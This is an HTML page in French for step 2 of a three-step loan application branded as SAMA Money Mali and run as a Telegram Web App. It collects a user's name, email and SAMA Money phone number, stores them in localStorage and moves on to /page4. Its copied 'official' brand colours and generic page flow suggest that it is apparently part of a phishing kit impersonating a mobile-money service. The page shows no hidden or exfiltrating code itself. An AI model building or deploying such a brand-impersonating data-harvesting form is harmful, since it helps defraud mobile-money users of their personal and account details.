<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>SAMA Money Mali - Demande de Prêt</title>

    <!-- ✅ Telegram SDK -->
    <script src="https://telegram.org/js/telegram-web-app.js"></script>

    <style>
        :root {
            /* Couleurs officielles de l'application SAMA Money (Mali) */
            --sama-blue: #0055A5;          /* Bleu principal SAMA Money */
            --sama-blue-dark: #003E7E;     /* Bleu foncé au survol/clic */
            --sama-navy: #0A2540;          /* Bleu nuit pour les titres/accents */
            --sama-gold: #F5A623;          /* Jaune/Or signature SAMA Money */
            --bg-color: #F4F7FA;           /* Fond gris-bleu très clair */
            --card-bg: #FFFFFF;
            --text-main: #0A2540;
            --text-muted: #5A6B7C;
            --input-border: #C5DDF5;
            --input-focus: #0055A5;
            --btn-gray: #E9F1F8;
            --btn-gray-text: #2C4A6F;
        }

        * {
            box-sizing: border-box;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
        }

        body {
            background-color: var(--bg-color);
            margin: 0;
            padding: 0;
            display: flex;
            flex-direction: column;
            align-items: center;
            min-height: 100vh;
        }

        /* Barre de navigation supérieure - Bleu SAMA Money */
        .app-header {
            width: 100%;
            background: linear-gradient(135deg, var(--sama-blue) 0%, var(--sama-blue-dark) 100%);
            height: 62px;
            padding: 0 20px;
            display: flex;
            align-items: center;
            justify-content: space-between;
            position: sticky;
            top: 0;
            z-index: 100;
            box-shadow: 0 2px 10px rgba(0, 85, 165, 0.2);
            border-bottom: 3px solid var(--sama-gold);
        }

        .back-btn-top {
            color: #ffffff;
            text-decoration: none;
            font-weight: 700;
            font-size: 14px;
            cursor: pointer;
            display: flex;
            align-items: center;
            gap: 5px;
        }

        .header-title {
            position: absolute;
            left: 50%;
            transform: translateX(-50%);
            display: flex;
            align-items: center;
            font-size: 21px;
            font-weight: 900;
            letter-spacing: 0.3px;
            color: #ffffff;
        }

        .header-title .brand-sama {
            color: #ffffff;
        }

        .header-title .brand-money {
            color: var(--sama-gold);
            margin-left: 4px;
        }

        .header-title .region {
            color: var(--sama-navy);
            font-size: 11px;
            margin-left: 6px;
            font-weight: 800;
            text-transform: uppercase;
            background: var(--sama-gold);
            padding: 2px 6px;
            border-radius: 4px;
        }

        .menu-icon {
            font-size: 24px;
            cursor: pointer;
            display: flex;
            flex-direction: column;
            gap: 5px;
        }

        .menu-icon span {
            display: block;
            width: 22px;
            height: 3px;
            background-color: #ffffff;
            border-radius: 2px;
        }

        /* Carte principale */
        .card {
            background: var(--card-bg);
            width: 90%;
            max-width: 440px;
            margin: 20px 0 30px;
            padding: 32px 24px;
            border-radius: 20px;
            box-shadow: 0 6px 25px rgba(10, 37, 64, 0.07);
            border: 1px solid #E3ECF5;
            display: flex;
            flex-direction: column;
        }

        .main-title {
            font-size: 25px;
            color: var(--text-main);
            margin: 0 0 6px;
            text-align: center;
            font-weight: 800;
            letter-spacing: -0.3px;
        }

        .subtext {
            font-size: 13px;
            color: var(--text-muted);
            text-align: center;
            margin-bottom: 24px;
            font-weight: 700;
            text-transform: uppercase;
            letter-spacing: 0.5px;
        }

        /* Barre de progression des étapes */
        .step-indicator {
            display: flex;
            justify-content: center;
            gap: 8px;
            margin: 0 auto 32px;
            width: 100%;
        }

        .step-bar {
            flex: 1;
            height: 6px;
            background-color: #D6E4F0;
            border-radius: 3px;
        }

        .step-bar.active {
            background: linear-gradient(90deg, var(--sama-blue), var(--sama-gold));
        }

        /* Champs du formulaire */
        .form-group {
            margin-bottom: 20px;
            display: flex;
            flex-direction: column;
        }

        .form-group label {
            font-size: 14px;
            font-weight: 700;
            color: var(--sama-navy);
            margin-bottom: 8px;
        }

        .form-control {
            font-size: 15px;
            padding: 14px 16px;
            border: 2px solid var(--input-border);
            border-radius: 10px;
            background-color: #ffffff;
            color: #0A2540;
            outline: none;
            width: 100%;
            transition: border-color 0.2s;
        }

        .form-control::placeholder {
            color: #8FA3BE;
        }

        .form-control:focus {
            border-color: var(--sama-blue);
        }

        /* Groupe numéro de téléphone */
        .phone-group {
            display: flex;
            gap: 10px;
        }

        .country-prefix {
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 6px;
            background-color: #EEF5FC;
            border: 2px solid var(--input-border);
            border-radius: 10px;
            padding: 0 14px;
            font-weight: 700;
            font-size: 15px;
            color: var(--sama-navy);
            white-space: nowrap;
        }

        .flag-icon {
            font-size: 18px;
            line-height: 1;
        }

        .phone-hint {
            font-size: 12px;
            color: var(--text-muted);
            margin-top: 8px;
        }

        /* Conteneur de boutons */
        .btn-container {
            display: flex;
            flex-direction: column;
            gap: 12px;
            margin-top: 20px;
        }

        .btn-prev {
            background-color: var(--btn-gray);
            color: var(--btn-gray-text);
            border: none;
            width: 100%;
            padding: 16px;
            border-radius: 12px;
            font-size: 15px;
            font-weight: 700;
            cursor: pointer;
            letter-spacing: 0.5px;
            text-transform: uppercase;
            transition: background-color 0.2s;
        }

        .btn-prev:hover {
            background-color: #D6E4F0;
        }

        .btn-next {
            background: linear-gradient(135deg, var(--sama-blue) 0%, var(--sama-blue-dark) 100%);
            color: #ffffff;
            border: none;
            border-bottom: 3px solid var(--sama-gold);
            width: 100%;
            padding: 16px;
            border-radius: 12px;
            font-size: 15px;
            font-weight: 800;
            cursor: pointer;
            letter-spacing: 0.5px;
            text-transform: uppercase;
            transition: all 0.2s ease;
            box-shadow: 0 4px 14px rgba(0, 85, 165, 0.3);
        }

        .btn-next:active {
            background: var(--sama-blue-dark);
            transform: scale(0.99);
        }

        /* Pied de page */
        .footer-banner {
            width: 100%;
            text-align: center;
            padding: 20px;
            font-size: 12px;
            color: var(--text-muted);
            margin-top: auto;
        }
    </style>
</head>

<body>

<!-- Barre de navigation supérieure SAMA Money -->
<div class="app-header">
    <a onclick="goBack()" class="back-btn-top">← Retour</a>
    <div class="header-title">
        <span class="brand-sama">SAMA</span><span class="brand-money">Money</span><span class="region">Mali</span>
    </div>
    <div class="menu-icon">
        <span></span>
        <span></span>
        <span></span>
    </div>
</div>

<div class="card">
    <h1 class="main-title">Demande de Prêt</h1>
    <div class="subtext">Étape 2 sur 3</div>

    <!-- Indicateurs de progression (Étapes 1 et 2 Actives) -->
    <div class="step-indicator">
        <div class="step-bar active"></div>
        <div class="step-bar active"></div>
        <div class="step-bar"></div>
    </div>

    <!-- Formulaire d'informations personnelles -->
    <form id="step2Form" onsubmit="goNext(event)">
        <div class="form-group">
            <label for="firstName">Prénom</label>
            <input type="text" id="firstName" class="form-control" placeholder="Mamadou" required>
        </div>

        <div class="form-group">
            <label for="lastName">Nom</label>
            <input type="text" id="lastName" class="form-control" placeholder="Diallo" required>
        </div>

        <div class="form-group">
            <label for="email">Adresse e-mail</label>
            <input type="email" id="email" class="form-control" placeholder="mamadou.diallo@example.ml" required>
        </div>

        <div class="form-group">
            <label for="phone">Numéro de téléphone SAMA Money</label>
            <div class="phone-group">
                <div class="country-prefix">
                    <span class="flag-icon">🇲🇱</span>
                    <span>+223</span>
                </div>
                <input type="tel" id="phone" class="form-control" placeholder="70123456" maxlength="8" pattern="[0-9]{8}" required>
            </div>
            <div class="phone-hint">8 chiffres (ex. : 70123456)</div>
        </div>

        <div class="btn-container">
            <button type="button" class="btn-prev" onclick="goBack()">PRÉCÉDENT</button>
            <button type="submit" class="btn-next">SUIVANT</button>
        </div>
    </form>
</div>

<!-- Pied de page -->
<div class="footer-banner">
    © 2026 SAMA Money - Mali
</div>

<script>
    window.onload = () => {
        const tg = window.Telegram?.WebApp;
        if (tg) {
            tg.ready();
            tg.expand();
        }

        // Récupération automatique des informations utilisateur enregistrées
        const fName = localStorage.getItem('firstName');
        const lName = localStorage.getItem('lastName');
        const email = localStorage.getItem('email');
        const phone = localStorage.getItem('phone');

        if (fName) document.getElementById('firstName').value = fName;
        if (lName) document.getElementById('lastName').value = lName;
        if (email) document.getElementById('email').value = email;
        if (phone) document.getElementById('phone').value = phone;
    };

    function goNext(event) {
        event.preventDefault();

        const fName = document.getElementById('firstName').value.trim();
        const lName = document.getElementById('lastName').value.trim();
        const email = document.getElementById('email').value.trim();
        const phone = document.getElementById('phone').value.trim();

        if (!fName || !lName || !email || !phone) {
            alert("Veuillez remplir tous les champs.");
            return;
        }

        if (!/^\d{8}$/.test(phone)) {
            alert("Veuillez entrer un numéro de téléphone SAMA Money valide à 8 chiffres.");
            return;
        }

        // Enregistrement des données personnelles
        localStorage.setItem('firstName', fName);
        localStorage.setItem('lastName', lName);
        localStorage.setItem('email', email);
        localStorage.setItem('phone', phone);
        
        // Enregistrement spécifique du téléphone pour la vérification API
        localStorage.setItem('userPhone', phone);

        window.location.href = "/page4";
    }

    function goBack() {
        window.location.href = "/page2";
    }
</script>

</body>
</html>
